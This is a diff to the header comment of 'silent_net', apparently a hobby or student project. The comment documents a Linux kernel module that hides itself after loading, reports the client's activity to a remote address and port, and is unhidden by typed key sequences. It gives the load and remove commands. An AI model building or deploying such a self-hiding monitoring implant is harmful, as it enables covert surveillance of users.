@@ -2,8 +2,24 @@
  * This is a source code of the client side
  * Of 'silent_net' project.
  *
- * blah blah blah
+ * Main code for client side.
+ * Keeps track of main events which helps server side
+ * To understand what's the client up to and if he is
+ * Working. This is a kernel module which only root user
+ * Can load into the system.
+ * Module works with threads in background, therefore when removing
+ * It is fine for it to take a couple of seconds until all tasks finished.
  *
+ * In order to load it ->
+ * insmod proj.ko dAddress=<destination address:str> dPort=<destination port:int> uName=<user name:str>
+ *
+ * In order to remove it (Make sure module is unhidden) ->
+ * rmmod proj.ko
+ *
+ * After loading, module is hidden.
+ * Therefore in order to unhide it type the following sequence - "x-x"
+ * If needed to hide it again, type the following sequence - "h-h"
+ * The char '-' is not the one in the numpad but rather the main board
  *
  */
 
